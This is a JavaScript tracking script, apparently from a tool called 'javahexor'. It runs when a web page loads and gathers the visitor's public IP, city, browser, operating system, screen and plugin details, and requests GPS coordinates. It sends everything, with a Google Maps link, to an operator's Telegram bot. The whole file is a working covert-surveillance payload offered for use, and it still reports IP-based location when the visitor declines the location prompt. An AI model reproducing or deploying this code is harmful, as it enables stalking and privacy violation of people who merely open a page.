// For More Info Visit -> https://github.com/Whitecat18/javahexor
// New : Get OS Information, Coordinates of the device The Time does he opens the site. Location, Public Ipv4 , City , Device Basic Info..etc

// Don't change the Line 5 and 6. Because Automation Script Plays a Role Here.
const botToken = 'YOUR_TELEGRAM_BOT_API_KEY';
const chatId = 'YOUR_CHAT_ID';

const getIP = async () => {
try {
const response = await fetch('https://api.ipify.org?format=json');
const data = await response.json();
return data.ip;
} catch (error) {
console.log(error);
}
};

const getLocation = async () => {
try {
const response = await fetch('https://ipapi.co/json/');
const data = await response.json();
return `${data.city}, ${data.region}, ${data.country}`;
} catch (error) {
console.log(error);
}
};

const askLocation = () => {
return new Promise((resolve, reject) => {
navigator.geolocation.getCurrentPosition(
position => {
const { latitude, longitude } = position.coords;
resolve({ latitude, longitude });
},
error => {
reject(error);
}
);
});
};

const getBrowserInfo = () => {
const browserName = navigator.appName;
const browserVersion = navigator.appVersion;
const userAgent = navigator.userAgent;
const platform = navigator.platform;
const language = navigator.language;
return `Browser Name: ${browserName}\nBrowser Version: ${browserVersion}\nUser Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`;
};

const getOsInfo = () => {
const os = navigator.platform;
const osVersion = navigator.oscpu;
const language = navigator.language;
return `Operating System: ${os}\nOperating System Version: ${osVersion}\nLanguage: ${language}`;
};

const getDeviceInfo = () => {
const screenWidth = screen.width;
const screenHeight = screen.height;
const colorDepth = screen.colorDepth;
const cookiesEnabled = navigator.cookieEnabled;
const doNotTrack = navigator.doNotTrack;
const plugins = Array.from(navigator.plugins, plugin => `${plugin.name} ${plugin.version}`);
const mimeTypes = Array.from(navigator.mimeTypes, mimeType => `${mimeType.type}`);
return `Screen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nColor Depth: ${colorDepth}\nCookies Enabled: ${cookiesEnabled}\nDo Not Track: ${doNotTrack}\nPlugins: ${plugins}\nMime Types: ${mimeTypes}`;
};

const createGoogleMapsLink = (latitude, longitude) => {
return `https://www.google.com/maps?q=${latitude},${longitude}`;
};


Promise.all([getIP(), getLocation()])
.then(async ([publicIP, location]) => {
const browserInfo = getBrowserInfo();
const osInfo = getOsInfo();
const deviceInfo = getDeviceInfo();
let message = `Location: THE USER HAS DECLINED\nPublic IP: ${publicIP}\n\n${browserInfo}\n\n${osInfo}\n\n${deviceInfo}`;
let googleMapsLink = '';

    try {
      const position = await askLocation();
      const { latitude, longitude } = position;
      const locationMessage = `Latitude: ${latitude}\nLongitude: ${longitude}`;
      message = `Location: ${location}\nPublic IP: ${publicIP}\n\n${browserInfo}\n\n${osInfo}\n\n${deviceInfo}\n${locationMessage}`;
      googleMapsLink = createGoogleMapsLink(latitude, longitude);
    } catch (error) {
      console.log("The user has declined sharing their location.");
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}\n\nGoogle Maps Link: ${googleMapsLink}`;
    fetch(url);
})
.catch(error => console.log(error));